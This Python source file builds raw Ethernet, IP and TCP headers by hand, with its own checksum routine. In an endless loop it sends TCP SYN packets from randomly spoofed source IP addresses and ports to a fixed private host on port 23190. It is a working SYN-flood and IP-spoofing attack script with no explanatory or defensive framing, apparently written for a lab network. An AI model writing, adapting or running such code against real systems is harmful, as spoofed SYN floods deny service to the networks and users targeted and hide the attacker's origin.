import struct

import socket

import random

import time

from header.eth import *

from header.ip import *

from header.tcp import *



def make_chksum( header ):



  size = len( header )

  if size % 2:

    header = header + b'\x00'

    size = len( header )



  size = size // 2

  header = struct.unpack('!' + str(size) + 'H', header )

  chksum = sum( header )



  carry = chksum & 0xFF0000

  carry = carry >> 16

  while carry != 0:

    chksum = chksum & 0xFFFF

    chksum = chksum + carry

    carry = chksum & 0xFF0000

    carry = carry >> 16



  chksum = chksum ^ 0xFFFF

  return chksum



while True:



  eth = Eth()

  ip = Ip()

  tcp = Tcp()



  port = random.randrange( 10000, 65535 )



  tcp.src = port

  tcp.dst = 23190

  tcp.seq = 33333

  tcp.ack = 0

  tcp.length = 20

  tcp.flag = 2

  tcp.window_size = 0

  tcp.chksum = 0

  tcp.point_or_dummy = 0



  ip1 = random.randrange( 1, 255 )

  ip2 = random.randrange( 1, 255 )

  ip3 = random.randrange( 1, 255 )

  ip4 = random.randrange( 1, 255 )



  ip.ver = 4

  ip.length = 20

  ip.service = 0

  ip.total = 20 + len( tcp.header )

  ip.id = 0x1234

  ip.flag = 0

  ip.offset = 0

  ip.ttl = 64

  ip.type = 6

  ip.chksum = 0

  ip.src = str(ip1) + '.' + str(ip2) + '.' + str(ip3) + '.' + str(ip4)

  ip.dst = '192.168.6.197'

  ip.chksum = make_chksum( ip.header )



  length = struct.pack('!H', tcp.length)



  pseudo = ip._src + ip._dst + b'\x00' + ip._type + length + tcp.header

  tcp.chksum = make_chksum( pseudo )



  eth.dst = '00:0c:29:3d:69:45'

  eth.src = '00:50:56:3b:25:f8'

  eth.type = 0x0800





  sock = socket.socket( socket.AF_PACKET, socket.SOCK_RAW )

  sock.bind( ('eth0', socket.SOCK_RAW) )



  sock.send( eth.header + ip.header + tcp.header )



  time.sleep(1)
